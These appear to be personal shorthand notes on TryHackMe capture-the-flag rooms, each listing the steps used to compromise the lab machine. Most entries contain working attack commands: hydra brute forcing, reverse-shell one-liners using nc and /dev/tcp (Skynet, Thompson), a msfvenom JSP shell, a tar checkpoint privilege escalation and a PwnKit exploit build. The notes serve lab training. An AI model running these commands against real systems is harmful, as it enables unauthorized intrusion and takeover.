    - `/robots.txt`: $dic
    - `ferox -kE -x js php html css etc.`
    - /wp-login.php
        - wpscan --disable-tls-checks
    - hydra [^](https://www.einstijn.com/penetration-testing/website-username-password-brute-forcing-with-hydra/)
- [🏡](https://tryhackme.com/room/neighbour) Neighbour
    
    ---
    
    Writeup: [YouTube](https://youtu.be/OY8wp9LOM6o) // Blog
    
    ---
    
    firefox:
    
    - http://$ip, `CTRL+U` guest:guest
    - http://$ip/profile.php?user=**admin**
    
    ---
    
- [🐱‍👤](https://tryhackme.com/room/ninjaskills) Ninja Skills
    
    ---
    
    Writeup: [YouTube](https://youtu.be/Kdn8ieD66Io) // Blog
    
    ---
    
    find / -type f \( -name 8V2L -o -name bny0 -o -name c4ZX -o -name D8B3 -o -name FHl1 -o -name oiMO -o -name PFbD -o -name rmfX -o -name SRSq -o -name uqyw -o -name v2Vb -o -name X1Uy \) 2>>/dev/null
    
    ---
    
- [🔓](https://tryhackme.com/room/overpass) Overpass
    
    ---
    
    Writeup: [YouTube](https://youtu.be/jnylh6R40z4) // Blog
    
    ---
    
    l****.js > Cookie: SessionToken=statusOrCookie > firefox add cookie
    
    - ssh2john key > hash
    - john hash rockyou.txt
    - passphrase:j*****3
    - ls .o******* > ROT47 [^](https://gchq.github.io/CyberChef/#recipe=ROT47(47)&input=LExRPzI%2BNlFpUSRKREU2PlFbUUEyRERRaVFEMko1QzJIPz1KOj84QTo0RUZDNlFOLg)
    - [{"name":"S*****","pass":"s*******************e"}]
    
    cat /etc/crontab
    
    - nano /etc/hosts > add $localip
    - Add revshell to crontab/$file, locally > nc
    
    ---
    
- [🥒](https://tryhackme.com/room/picklerick) Pickle Rick
    
    ---
    
    Writeup: [YouTube](https://youtu.be/sN3pBYt_wVI) // Blog
    
    ---
    
    rustscan -a $ip
    
    feroxbuster -x js php html css etc.
    
    - index source: user
    - robots.txt: pw
    
    /l****.php
    
    - while read line; do echo $line; done < $file [^](https://www.javatpoint.com/bash-read-file)
    - ls -la /home/
    - sudo -l
    - sudo cp /root/$file .
    
    ---
    
- [👨‍💻](https://tryhackme.com/room/rrootme) RootMe
    
    ---
    
    Writeup: [YouTube](https://youtu.be/9dlgsZ3x57w) // Blog
    
    ---
    
    rustscan -a $ip -p $ports -- -sC -sV
    
    feroxbuster -x js php
    
    - u*******
    - p****
    
    Burp > Intruder FUZZ > `.php*` [^](https://gtfobins.github.io/gtfobins/python/)
    
    SUID [^](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) - `find / -perm /4000`
    
    `python -c 'print(open("/****/****.txt").read())’` [^](https://gtfobins.github.io/gtfobins/python/)
    
    ---
    
- [🔴](https://tryhackme.com/room/res) Res
    
    ```
    Research: [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis) [^](https://redis.io/docs/data-types/), Webshell [^](https://redis.io/docs/data-types/)
    
    redis-cli -h $ip
    
    msfconsole -q
    search redis
    use scanner/redis/file_upload
     - set LocalFile $shell
     - set RemoteFile /var/www/html/
    
    linpeas: xxd, GTFO Bins [^](https://gtfobins.github.io/gtfobins/xxd/)
    - cat /etc/passwd
    - copy hash > $file
    ```
    
- [🤖](https://tryhackme.com/room/skynet) Skynet
    
    ```
    rust:22,80,445...
    
    enum4linux: //$ip/anonymous|m*********n
    
    ffuf: /s**********l
    
    hydra -l m*********n -P l**1.txt $ip http-post-form "/s**********lsrc/login.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password incorrect." -vV -t 1
     
    smb
     - m*********n:)**************`
     - notes/i********t.txt
    
    http://$ip/4**************d
     - ffuf=/a***********r
    
    searchsploit -m 2***1
     - /alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/m*********n/user.txt
     - /alerts/alertConfigField.php?urlConfig=http://$ip/shell.php?
    
    cat /etc/crontab
     - /home/m*********n/backups/backup.sh
     - echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $10.4.38.220 3333 >/tmp/f' > shell.sh
     - touch --checkpoint-action=exec=sh shell.sh
     - touch "/var/www/html/--checkpoint=1"
    ```
    
- [🌶](https://tryhackme.com/room/startup) Startup
    
    ```
    21,22,80
    M***
    /f****
    ftp=Anonymous Login
    shell.php ^ /files/ftp
    cat /recpie.txt
    get s********.pcap
    l*****:c*****************
    ssh@l*****
    cat user.txt
    cd scripts
    echo '$shell.sh' > /etc/print.sh
    nc -lvnp $port
    ```
    
- [🐱](https://tryhackme.com/room/bsidesgtthompson) Thompson
    
    ---
    
    Writeup: [YouTube](https://youtu.be/EbtbEnoLweo) // Blog
    
    ---
    
    rustscan
    
    - 8009
    - 8080
    
    feroxbuster
    
    - /host-manager/
    - /manager/
    - t*****:s*****
    - Upload RevShell
        
        `msfvenom -p java/jsp_shell_reverse_tcp LHOST=$ip LPORT=$port -f war > reverse.war   strings reverse.war | grep jsp # in order to get the name of the file`
        
    - Upgrade Shell
        - `python3 -c "import pty; pty.spawn('/bin/bash')"`
        - `[CTRL+Z]`
        - `stty raw -echo;fg`
        - `export TERM=xterm`
    - /home/j***/id.sh
    - nano id.sh
        - `bash -i >& /dev/tcp/$ip/$port 0>&1`
    
    ---
    
- [🌐](https://tryhackme.com/room/introwebapplicationsecurity?referrer=5fb398581c090b7c78567a5a) Web Application Security
    
    ---
    
    Writeup: YouTube (Coming Soon)
    
    ---
    
    Web app: app w/out install on remote server e.g. gmail, office on., etsy.
    
    Identify/Auth Fail: bruteforce-attk, weak|clear-text passowrds.
    
    Broken Acc. Control: not least priv (IDOR), mod other users data, access other pages without auth.
    
    Injection: input w/ malious code to trick app.
    
    Crypt Fail: HTTP != HTTPS, weak crypt e.g. ROT13, default keys e.g. 1234.
    
    - [ ]  [Tweet](https://twitter.com/intent/tweet?url=https://tryhackme.com/room/introwebapplicationsecurity&via=realtryhackme&text=Web%20Application%20Security%20-%20I%20have%20just%20completed%20this%20room!%20Check%20it%20out:%20&hashtags=tryhackme,security,webapplication,IDOR,IdentificationandAuthenticationFailure,BrokenAccessControl,CryptographicFailures,introwebapplicationsecurity)
- [🐱‍🐉](https://tryhackme.com/room/wgelctf) WGEL
    
    ---
    
    Writeup: [YouTube](https://youtu.be/J85neuTv354) // Blog
    
    ---
    
    rustscan: 22 ssh, 80 http
    
    firefox: http://$ip, view source
    
    gobuster: /sitemap/, /sitemap/.ssh
    
    ssh j****e:key, chmod 600 key
    
    sudo -l, /usr/bin/wget
    
    - local: python -m http.server, remote: wget http://$ip/linpeas.sh
    - chmod +x linpeas.sh
    
    CVE-201-4034 [^](https://github.com/arthepsy/CVE-2021-4034) [^](https://raw.githubusercontent.com/arthepsy/CVE-2021-4034/main/cve-2021-4034-poc.c)
    
    - gcc cve-2021-4034-poc.c -o cve-2021-4034-poc
    
    ---
    
- [🐇](https://tryhackme.com/room/yearoftherabbit) Year Of The Rabbit
    
    ---
    
    Writeup: [YouTube](https://youtu.be/cGDSSXsw1i8) // Blog
    
    ---
    
    rustscan -a $ip -p $ports -- -sC -sV
    
    feroxbuster
    
    /a****s/ > css comment
    
    burp > repeater > header `/W*********U`
    
    wget $png > binwalk > binwalk -e | strings $png
    
    copy/paste passwords > `hydra -l f****** -P $file $ip ftp` 
    
    ftp -A $ip > get $file.txt > beef $file.txt
    
    find / -name s3cr3t 2>/dev/null, su g*********e 
    
    sudo -u#-1 /usr/bin/vi /home/g*********e/user.txt
    
    ---